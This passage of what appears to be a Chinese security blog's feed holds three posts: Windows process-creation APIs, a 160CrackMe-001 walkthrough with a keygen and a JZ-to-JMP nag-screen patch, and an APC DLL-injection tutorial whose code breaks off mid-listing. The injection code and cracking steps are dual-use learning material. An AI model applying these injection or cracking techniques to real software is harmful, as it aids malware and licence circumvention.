    <category term="PE" scheme="https://b1ack1e.github.io/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>创建进程API</title>
    <link href="https://b1ack1e.github.io/2021/07/14/%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/"/>
    <id>https://b1ack1e.github.io/2021/07/14/%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/</id>
    <published>2021-07-14T07:15:24.000Z</published>
    <updated>2021-07-14T10:51:23.584Z</updated>
    
    <content type="html"><![CDATA[<h4 id="创建进程API"><a href="#创建进程API" class="headerlink" title="创建进程API"></a>创建进程API</h4><p>在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软提供WinExec，ShellExecute和CreateProcess等函数来实现进程创建。</p><h4 id="具体实现及函数介绍"><a href="#具体实现及函数介绍" class="headerlink" title="具体实现及函数介绍"></a>具体实现及函数介绍</h4><h5 id="WinExec"><a href="#WinExec" class="headerlink" title="WinExec"></a>WinExec</h5><p>运行指定的应用程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UINT WinExec(</span><br><span class="line">  LPCSTR lpCmdLine,</span><br><span class="line">  UINT   uCmdShow</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpCmdLine：要执行的应用程序的命令行。如果参数中的可执行文件名称不包含文件路径，则系统按以下顺序搜索可执行文件：</p><ol><li>应用程序加载的目录</li><li>当前目录</li><li>Windows系统目录。GetSystemDirectory函数检索此目录的路径。</li><li>Windows目录。GetWindowsDirectory函数检索此目录的路径。</li><li>PATH环节变量中列出的目录</li></ol><p>uCmdShow：显示选项，具体内容如下表：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SW_HIDE<BR>0</BR></td><td>隐藏窗口并激活另一个窗口</td></tr><tr><td>SW_SHOWNORMAL<BR>SW_NORMAL<BR>1</BR></BR></td><td>激活并显示一个窗口</td></tr><tr><td>SW_SHOWMINIMIZED<BR>2</BR></td><td>激活窗口并将其显示为最小化的窗口</td></tr><tr><td>SW_SHOWMAXIMIZED<br>SW_MAXIMIZE<br>3</td><td>激活窗口并将其显示为最大化窗口</td></tr><tr><td>SW_SHOWNOACTIVATE<br>4</td><td>以最近的大小和位置显示窗口</td></tr><tr><td>SW_SHOW<br>5</td><td>激活窗口并以其当前大小和位置显示它</td></tr><tr><td>SW_MINIMIZE<br>6</td><td>最小化指定的窗口并激活Z顺序中的下一个顶级窗口</td></tr><tr><td>SW_SHOWMINNOACTIVE<br>7</td><td>将窗口显示为最小化窗口</td></tr><tr><td>SW_SHOWNA<br>8</td><td>以当前大小和位置显示窗口</td></tr><tr><td>SW_RESTORE<br>9</td><td>激活并显示窗口</td></tr><tr><td>SW_SHOWDEFAULT<br>10</td><td>根据启动应用程序的程序传递给CreateProcess函数的STARTUPINFO结构中指定的SW_值设置显示状态。</td></tr><tr><td>SW_FORCEMINIMIZE<br>11</td><td>最小化一个窗口，即使拥有该窗口的线程没有响应。仅在最小化来自不同线程的窗口时才应使用此标志。</td></tr></tbody></table><p>返回值：如果函数成功，则返回值大于31；如果函数失败，则返回值是以下错误值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>系统内存或资源不足</td></tr><tr><td>ERROR_BAD_FORMAT</td><td>exe文件无效</td></tr><tr><td>ERROR_FILE_NOT_FOUND</td><td>找不到指定文件</td></tr><tr><td>ERROR_PATH_NOT_FOUND</td><td>找不到指定的路径</td></tr></tbody></table><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HINSTANCE hInstance = ShellExecute(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\TestApc.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, SW_NORMAL);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)hInstance &lt;= <span class="number">32</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute创建失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute创建成功\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>创建的进程为之前编写过得MFC程序，运行此程序即可提示创建成功，同时TestAPC也被成功创建。</p><p><img src="/2021/07/14/%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/1.png"></p><h5 id="ShellExecute函数"><a href="#ShellExecute函数" class="headerlink" title="ShellExecute函数"></a>ShellExecute函数</h5><p>对指定文件执行操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HINSTANCE ShellExecuteA(</span><br><span class="line">  HWND   hwnd,</span><br><span class="line">  LPCSTR lpOperation,</span><br><span class="line">  LPCSTR lpFile,</span><br><span class="line">  LPCSTR lpParameters,</span><br><span class="line">  LPCSTR lpDirectory,</span><br><span class="line">  INT    nShowCmd</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hwnd：用于显示UI或者错误信息的父窗口的句柄。如果操作与窗口无关，则此值可以为NULL。</p><p>lpOperation：指向以空字符结尾的字符串的指针，它在本例中成为动词，用于指定要执行的操作。常使用的动词有：</p><ul><li>edit：启动编辑器并打开文档进行编辑。如果lpFile不是文档文件，则该函数将失败。</li><li>explore：探索由lpFile指定的文件夹。</li><li>find：在由lpDirectory指定的目录中启动搜索。</li><li>open：打开由lpFile指定的项目。该项目可以是文件也可以是文件夹。</li><li>print：打印由lpFile指定的文件。如果lpFile不是文档文件，则该函数失败。</li><li>NULL：如果可用，则使用默认动词。如果不可用，则使用“打开”动词。如果两个动词都不可用，则系统使用注册表中列出的第一个动词。</li></ul><p>lpFile：指向以空字符结尾的字符串的指针，该字符串要在其上指向指定谓词的文件或对象。如果lpDirectory参数使用相对路径，则lpFile不要使用相对路径。</p><p>lpParameters：如果lpFile指定一个可执行文件，则此参数是一个指向空字符结尾的字符串的指针，该字符串指定要传递给应用程序的参数。如果lpFile指定一个文档文件，则lpParameters应该为NULL。</p><p>lpDirectory：指向以空终止的字符串的指针，该字符串指定操作的默认目录。如果此值为NULL，则使用当前的工作目录。如果在lpFile提供了相对路径，请不要对lpDirectory使用相对路径。</p><p>nShowCmd：指定应用程序在打开时如何显示标志，具体值在上文。</p><p>返回值：如果函数成功，则返回大于32的值。如果函数失败，则它返回一个错误值，指示失败的原因。</p><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HINSTANCE hInstance = ShellExecute(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\TestApc.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, SW_NORMAL);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)hInstance &lt;= <span class="number">32</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute创建失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute创建成功\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>运行程序提示创建成功，同时TestAPC被成功创建。</p><p><img src="/2021/07/14/%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/2.png"></p><h5 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h5><p>创建一个新进程及主线程。新进程在调用进程的安全的上下文中运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL CreateProcess(</span><br><span class="line">  LPCSTR                lpApplicationName,</span><br><span class="line">  LPSTR                 lpCommandLine,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">  BOOL                  bInheritHandles,</span><br><span class="line">  DWORD                 dwCreationFlags,</span><br><span class="line">  LPVOID                lpEnvironment,</span><br><span class="line">  LPCSTR                lpCurrentDirectory,</span><br><span class="line">  LPSTARTUPINFOA        lpStartupInfo,</span><br><span class="line">  LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpApplicationName：要执行的模块的名称。可以设置为NULL。要运行批处理文件，必须启动命令解释程序，并将其设置为cmd.exe。</p><p>lpCommandLine：要执行的命令行。</p><p>lpProcessAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新进程对象的句柄是否可以被子进程继承。如果<em>lpProcessAttributes</em>为NULL，则不能继承句柄。</p><p>lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新线程对象句柄是否可由子进程继承。如果<em>lpThreadAttributes</em>为 NULL，则不能继承句柄。</p><p>bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。如果参数为 FALSE，则不继承句柄。</p><p>dwCreationFlags：控制优先级类和进程创建的标志。</p><p>lpEnvironment：指向新进程的环境块的指针。如果此参数为NULL，则新进程使用调用进程的环境。</p><p>lpCurrentDirectory：进程当前目录的完整路径。该字符串还可以指定 UNC 路径。如果此参数为NULL，则新进程将与调用进程具有相同的当前驱动器和目录。</p><p>lpStartupInfo：指向STARTUPINFO或STARTUPINFOEX结构的指针 。STARTUPINFO或STARTUPINFOEX中的句柄在不需要时必须由CloseHandle关闭。</p><p>lpProcessInformation：指向PROCESS_INFORMATION结构的指针，该结构接收有关新进程的标识信息。PROCESS_INFORMATION中的句柄必须在不需要时由CloseHandle关闭。</p><p>返回值：如果函数成功，则返回值非0；若失败，则返回值为0。</p><p>具体代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">si.wShowWindow = SW_NORMAL;</span><br><span class="line">BOOL flag = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\TestApc.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateProcess创建成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateProcess创建失败\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>运行之后，即可成功创建TestAPC进程。</p><p><img src="/2021/07/14/%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;创建进程API&quot;&gt;&lt;a href=&quot;#创建进程API&quot; class=&quot;headerlink&quot; title=&quot;创建进程API&quot;&gt;&lt;/a&gt;创建进程API&lt;/h4&gt;&lt;p&gt;在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="启动技术" scheme="https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe--001</title>
    <link href="https://b1ack1e.github.io/2021/07/14/160CrackMe-001/"/>
    <id>https://b1ack1e.github.io/2021/07/14/160CrackMe-001/</id>
    <published>2021-07-14T02:23:13.000Z</published>
    <updated>2021-07-14T06:50:17.951Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。</p><p><img src="/2021/07/14/160CrackMe-001/1.png"></p><p>程序主题界面有两部分，第一部分是序列号加名字。</p><p><img src="/2021/07/14/160CrackMe-001/2.png"></p><p>第二部分是单纯的序列号，应该是比较简单。</p><p><img src="/2021/07/14/160CrackMe-001/3.png"></p><p>看完大体流程，开始分析。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查询程序的基本信息，可以看到未加壳，是用Delphi语言编写的。</p><p><img src="/2021/07/14/160CrackMe-001/4.png"></p><h5 id="先分析单纯的序列号。"><a href="#先分析单纯的序列号。" class="headerlink" title="先分析单纯的序列号。"></a>先分析单纯的序列号。</h5><p>用OD打开程序，搜索字符串，搜索错误的提示，可以看到成功与错误的提示，还有一个JNZ，这里应该是关键的判断跳转。</p><p><img src="/2021/07/14/160CrackMe-001/5.png"></p><p>在函数头部下断点，开始分析。可以看到它把Hello和Dude！压入栈之后，再将其拼接起来组成新的字符串，然后再与我们输入的序列号进行比较。</p><p><img src="/2021/07/14/160CrackMe-001/6.png"></p><p><img src="/2021/07/14/160CrackMe-001/7.png"></p><p>那么这里的序列号就是Hello Dude!。输入正确的序列号之后，弹出正确的窗口。</p><p><img src="/2021/07/14/160CrackMe-001/8.png"></p><h5 id="再来分析序列号加用户名"><a href="#再来分析序列号加用户名" class="headerlink" title="再来分析序列号加用户名"></a>再来分析序列号加用户名</h5><p>还是通过搜索错误提示的字符串，即可找到关键的跳转，在最后的跳转前查看一下，可以看到栈存放着两个值进行比较，一个是我们输入的123456，另一个是CW-80360-CRACKED，那么这个应该是要输入的serial。往上开始寻找这段序列号是如何生成的。在函数头部下断开始分析。</p><p><img src="/2021/07/14/160CrackMe-001/10.png"></p><p>首先是检测了输入的用户名长度，不可以小于4位。</p><p><img src="/2021/07/14/160CrackMe-001/9.png"></p><p>继续往下看，可以看到CW，-，CRACKED和数字这几段，然后通过一个函数将它们拼接起来，字母都是本身有的，那么就需要寻找数字的生成。</p><p><img src="/2021/07/14/160CrackMe-001/11.png"></p><p>数字是通过sub_406718生成的，而其中的参数是通过0x431750处传入的，那么这个值是从哪来的，从上分析。可以看到这里的计算过程。它是获取输入用户名第一位然后乘以0x29再乘以2。而之后的sub_406718作用是将十六进制转为十进制字符串。</p><p><img src="/2021/07/14/160CrackMe-001/12.png"></p><p>到这里整个过程就分析了，开始尝试编写注册机</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt; stdio.h &gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;corecrt_malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Name[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入大于四位的用户名\n&quot;</span>);</span><br><span class="line">    gets_s(Name, <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> Num;</span><br><span class="line">    Num = (Name[<span class="number">0</span>] * <span class="number">0x29</span>) * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">char</span>* s1=<span class="string">&quot;CW&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* s2 = <span class="string">&quot;CRACKED&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* s3= <span class="string">&quot;-&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* serial = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(serial, <span class="string">&quot;%s%s%d%s%s&quot;</span>, s1, s3, Num, s3, s2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;用户名是：%s\nserial是：%s&quot;</span>, Name, serial);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入用户名b1ackie，就可以计算出正确的serial。</p><p><img src="/2021/07/14/160CrackMe-001/13.png"></p><p>输入正确的值查看</p><p><img src="/2021/07/14/160CrackMe-001/14.png"></p><h4 id="弹窗的消除"><a href="#弹窗的消除" class="headerlink" title="弹窗的消除"></a>弹窗的消除</h4><p>先根据弹窗的提示信息，搜索字符串，可以定位到此处。</p><p><img src="/2021/07/14/160CrackMe-001/15.png"></p><p>执行出来，可以看到在外部有一个JZ跳转可以跳过这个弹窗函数，我们只需要将其修改为JMP就可以无条件跳走了。</p><p><img src="/2021/07/14/160CrackMe-001/16.png"></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>第一个crackme，还是比较简单的，没有什么难度，做起来比较轻松。</p><p>还记得上次做这个还是大一的时候，那个时候也刚接触这块没多久，当时还是看着帖子一步一步学着来。学习记录还是要坚持做下去，这些crackme也要坚持争取全部都做一遍。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/14/160Cr</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>APC注入</title>
    <link href="https://b1ack1e.github.io/2021/07/13/APC%E6%B3%A8%E5%85%A5/"/>
    <id>https://b1ack1e.github.io/2021/07/13/APC%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-13T07:25:36.000Z</published>
    <updated>2021-07-14T02:18:04.803Z</updated>
    
    <content type="html"><![CDATA[<h4 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h4><p>APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h5><p>将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD QueueUserAPC(</span><br><span class="line">  PAPCFUNC  pfnAPC,</span><br><span class="line">  HANDLE    hThread,</span><br><span class="line">  ULONG_PTR dwData</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>pfnAPC：当指定线程执行可警告的等待操作时，指向应用程序提供的APC函数的指针。</p><p>hThread：线程的句柄。该句柄必须具有THREAD_SET_CONTEXT访问权限。</p><p>dwData：传递由pfnAPC参数指向的APC函数的单个值。</p><p>返回值：如果函数成功，则返回值为非0；如果失败，则返回值为0。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自己的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SingalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自己挂起时就是进入警告状态，此时便会执行APC队列函数。</p><h5 id="具体代码如下："><a href="#具体代码如下：" class="headerlink" title="具体代码如下："></a>具体代码如下：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlconv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlstr.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD <span class="title">GetPidByName</span><span class="params">(<span class="keyword">char</span>* pszProcessName)</span> </span>&#123;</span><br><span class="line">    HANDLE hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 PE32 = &#123; <span class="built_in"><span class="keyword">sizeof</span></span>(PE32) &#125;;</span><br><span class="line">    USES_CONVERSION;</span><br><span class="line">    CString ProcessName = <span class="built_in">A2T</span>(pszProcessName);</span><br><span class="line">    BOOL flag = <span class="built_in">Process32First</span>(hSnap, &amp;PE32);</span><br><span class="line">    <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">lstrcmp</span>(PE32.szExeFile, ProcessName) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> PE32.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = <span class="built_in">Process32Next</span>(hSnap, &amp;PE32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD* pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwThreadIdLength = <span class="number">0</span>;</span><br><span class="line">    DWORD dwBufferLength = <span class="number">1000</span>;</span><br><span class="line">    THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hSnapshot = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL bRet = TRUE;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 申请内存</span></span><br><span class="line">        pThreadId = <span class="keyword">new</span> DWORD[dwBufferLength];</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == pThreadId)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line">            bRet = FALSE;</span><br><span class="line">            <span 